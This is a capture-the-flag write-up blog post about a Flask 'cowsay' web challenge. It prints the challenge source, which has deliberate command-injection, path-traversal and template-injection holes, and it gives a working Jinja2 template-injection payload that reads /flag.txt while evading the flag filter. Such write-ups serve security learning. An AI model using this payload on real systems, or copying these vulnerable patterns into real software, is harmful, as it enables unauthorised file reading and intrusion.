---
title: "OSU League 2020/2021 - WEB_THREE"
date: 2021-03-07
draft: false
description: ""
tags: ["ctf"]
---
For this challenge, we are given a website that bears a resemblance to a previous challenge we did (cowsay), though this one is a bit more complicated.

{{< figure src="/img/1.png" >}}

We can start by just entering in some text and seeing what happens:

{{< figure src="/img/2.png" >}}

Neat! Let's look at the source code:

```python
# coding=utf-8

from flask import render_template, render_template_string, flash, redirect, session, url_for, request, g, Markup, Response
from app import app
import uuid
import traceback
import os

def _generate_cowsay_file():
    return '/tmp/cow-' + str(uuid.uuid4())


@app.route('/')
@app.route('/index')
def index():
    return render_template('index.html')


@app.route('/cowsay')
def cowsay():
    filename_in = _generate_cowsay_file()
    filename_out = _generate_cowsay_file()
    with open(filename_in, 'w') as f:
        f.write(str(request.args.get('msg'))[:2000])

    # cowsay!
    os.system('cat ' + filename_in + ' | /usr/games/cowsay -TU -W 2000 > ' + filename_out + ' 2>&1')
    return redirect('/render?path=' + filename_out, code=302)


@app.route('/render')
def about():
    try:
        with open(request.args.get('path', 'layout.html'), 'r') as f:
            resp = render_template_string('''{% extends "layout.html" %}{% block content %}<div class="jumbo"><h1>Your cow says...</h1><code>''' + f.read() + '''</code><br><p><a href="/">do it again!!!!!!!!!</a></p></div>{% endblock %}''')

            # check if the user is trying to do something evil :((
            if u'OSUSEC{' in resp:
                resp = u'I see the flag in the response! Nice try.'

            return Response(response=resp, status=200)
    except:
        msg = 'We could not fetch your page! Sorry :(\n\n' + traceback.format_exc()
        return Response(response=msg, status=500, mimetype='text/plain')
```

Ah, we have a Flask challenge.  We've done this before (see nopship)! All we have to do is a Flask injection to do arbitrary read on `flag.txt`, but there is a slight problem, the server actually checks to see if 'OSUSEC{' is in the output, and aborts if it does. That's ok, because we can just read only the text after that.

Doing a simple google search for arbitrary read with Flask injection will give us our payload:

```
{{ config.items()[4][1].__class__.__mro__[1].__subclasses__()[40]("/flag.txt").read()[27:120] }}
```

And running it we get the flag!

{{< figure src="/img/3.png" >}}

```
OSUSEC{ok_s0_y0u_f1gur3d-out_d1rect0ry-tr@versal_w0nt-b3_helpful-here?}
```
